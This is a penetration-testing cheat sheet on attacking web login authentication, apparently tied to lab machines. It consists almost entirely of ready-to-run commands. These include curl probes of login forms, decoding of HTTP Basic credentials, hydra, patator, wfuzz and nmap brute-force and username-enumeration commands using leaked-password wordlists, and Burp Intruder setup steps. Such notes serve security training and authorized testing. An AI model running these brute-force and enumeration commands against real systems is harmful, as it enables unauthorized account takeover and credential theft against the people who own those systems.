# Authentication Attacks

## Authentication Attacks



## Enumerate HTML Login Forms

We can use curl to view page source code and see the input of each data cell:

```bash
curl -s http://10.10.10.101/users/login.php | grep 'input name'
```

## HTTP Create User via POST

We can create a user with curl:

```text
curl -X POST -d 'username=testing123&password=test123&confirm=test123' http://victim/
```



### HTTP Basic Authentication

Decode

```bash
❯ echo -n 'dG9tY2F0OnMzY3JldA==' | base64 -d
tomcat:s3cret
```

Encode

```bash
❯ echo -n 'tomcat:s3cret' | base64
dG9tY2F0OnMzY3JldA==
```

#### Using HTTP Authentication

We can authenticate with curl:

```bash
curl -s -X GET http://10.10.10.95:8080/manager/html -H 'Authorization: Basic dG9tY2F0OnMzY3JldA==' -H 'Cookie: JSESSIONID=3AF413E376448C04207FC529CF694B62'
```

#### Bruteforce HTTP Basic Authentication

hydra:

```bash
HYDRA_PROXY_HTTP=http://127.0.0.1:8080 hydra -C /opt/SecLists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt -s 8080 10.10.10.95 http-get /manager/html
```

patator:

```bash
patator http_fuzz auth_type=basic url=http://10.10.10.95:8080/manager/html user_pass=FILE0 0=/opt/SecLists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt -x ignore:code=401
```

hydra without proxy:

```text
hydra -C /opt/SecLists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt http-get://10.10.10.10:8080/manager/html
```

### Enumerating Usernames via Error Messages

We can enumerate usernames with error messages.

`Invalid User`

#### BurpSuite Intruder

Add a position in the value that you want to intrude/fuzz:

```text
Intruder -> Positions -> Sniper -> Add Position
```

Select a dictionary attack with:

```text
Intruder -> Payloads -> Payload set -> Payload type (Simple List | Dictionary Attack)
```

Load the dictionary with:

```text
Intruder -> Payloads -> Payload Options -> Load
```

Match the string 'Invalid User' from the HTTP response:

```text
Intruder -> Options -> Grep - Match -> Clear -> Add -> Invalid User
```

Follow redirections on the target only:

```text
Intruder -> Options -> Redirections -> Follow redirections -> In-scope only
```

Start the attack with:

```text
Intruder -> Payloads -> Start attack OR Intruder Start Menu -> Start attack
```

#### patator

We can view the help panel with:

```text
patator http_fuzz --help
```

A few examples of an HTTP authentication dictionary attack: \(Change the parameters and their values\)

```text
patator http_fuzz url=http://target/login.php method=POST body='username=FILE0&password=admin&Submit=Login' 0=usernames.txt -x ignore:fgrep='Invalid User'
patator http_fuzz url=http://target/login.php method=POST body='username=FILE0&password=admin&Submit=Login' 0=usernames.txt follow=1 -x ignore:fgrep='Invalid User'
patator http_fuzz url=http://target/login.php method=POST body='username=FILE0&password=admin&Submit=Login' 0=usernames.txt follow=1 accept_cookie=1 -x ignore:fgrep='Invalid User'
```

**wfuzz**

A few examples of an HTTP authentication dictionary attack: \(Change the parameters and their values\)

```text
wfuzz -c -w names.txt -d "username=FUZZ&password=password" http://10.10.10.10/login.php
```

### Enumerating Usernames via Cookie Values

We can enumerate usernames with cookie values.

#### BurpSuite Intruder

Add a position in the value that you want to intrude/fuzz:

```text
Intruder -> Positions -> Sniper -> Add Position
```

Select a dictionary attack with:

```text
Intruder -> Payloads -> Payload set -> Payload type (Simple List | Dictionary Attack) Intruder -> Payloads -> Payload Options -> Load
```

Match the response string of an invalid user cookie parameter:

```text
Intruder -> Options -> Grep - Match -> Clear -> Add -> wrong_user
```

Follow redirections on the target only

```text
Intruder -> Options -> Redirections -> Follow redirections -> In-scope only
```

Start the attack with:

```text
Intruder -> Payloads -> Start attack OR Intruder Start Menu -> Start attack
```

#### patator

We can do a username enumeration with: \(Change the parameters and their values\)

```text
patator http_fuzz url=http://target/login.php method=POST body='username=FILE0&password=admin&Submit=Login' 0=usernames.txt --x ignore:fgrep='wrong_user'
patator http_fuzz url=http://target/login.php method=POST body='username=FILE0&password=admin&Submit=Login' 0=usernames.txt follow=1 -x ignore:fgrep='wrong_user'
patator http_fuzz url=http://target/login.php method=POST body='username=FILE0&password=admin&Submit=Login' 0=usernames.txt follow=1 accept_cookie=1 -x ignore:fgrep='wrong_user'
```

### Password Enumeration

#### patator

We can do a password enumeration with: \(Change the parameters and their values\)

```text
patator http_fuzz url=http://target/login.php method=POST body='username=admin&password=FILE0&Submit=Login' 0=passwords.txt --x ignore:fgrep='Invalid Password'
```

## Brute Force in Login Forms

### nmap

```text
nmap -p 80 --script http-brute --script-args 'http-brute.hostname=domain_name,http-brute.method=POST,http-brute.path=/login,userdb=users.txt,passdb=passwords.txt' -v domain_name -n
```

### hydra

```text
hydra -l username -P <IP> http-post-form "/login_file.php:username_parameter=^USER^&password_parameter=^PASS^:error message"

hydra -l username; -P passlist.txt <IP> https-post-form "/directory/filname.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect" -t 64

hydra -l admin -P /opt/SecLists/Passwords/10k_most_common.txt <IP> http-post-form "/dir/filename.php:username=^USER^&password=^PASS^:Invalid" -t 64
```

### wfuzz

```text
wfuzz -c -u http://<IP>/login.php -d 'username_param=FUZZ&password=FUZZ' -w <wordlist.txt> -hh 440

wfuzz --hh 1073 -c -u http://10.10.10.101/users/login.php -X POST -d "Username=admin&Password=FUZZ&Submit=Login" -w /opt/SecLists/Passwords/darkweb2017-top10000.txt

wfuzz -c -z wordlist1.txt wordlist2.txt -u http://<IP>/login.php -d 'username_param=FUZZ&password=FUZZ' -w <wordlist.txt> --hw 430

wfuzz --hw 36 -c -w /opt/SecLists/Passwords/darkweb2017-top1000.txt -d 'username=admin&password=FUZZ&submit=Login' http://10.10.10.86/login
```

#### wfuzz with cookie

```text
wfuzz -w cewl.out -d '<parameters>' -b '<cookie_value>' http://<IP>/login/index.php

wfuzz --hw 29 -c -w /opt/SecLists/Passwords/darkweb2017-top1000.txt -H 'Cookie: password=FUZZ' http://10.10.10.86:8080/ 

wfuzz --hc 200 -w cewl.out -d 'username=FUZZ&passwd=Curling2018!&otherparameters" -b <cookie> http://<ip>/administrator/index.php
```

#### wfuzz with proxy

```text
wfuzz -w cewl.out -d '<parameters>' -p 127.0.0.1:8080 http://<IP>/login/index.php
```

### patator

```text
patator http_fuzz url=http://10.10.10.108/zabbix/index.php method=POST body= 'name=zapper&password=FILE0&autologin=1&enter=Sign+in' 0=/usr/share/SecLists/Passwords/darkweb2017-top1000.txt accept\_cookie=1 follow=1 -x ignore:fgrep= 'Login name or password is incorrect.'
patator http_fuzz url=http://10.10.10.101/users/login.php method=POST body='Username=admin&Password=FILE0&Submit=Login' 0=/opt/SecLists/Passwords/darkweb2017-top10000.txt follow=1 -x ignore:fgrep='Invalid Login Details'
```



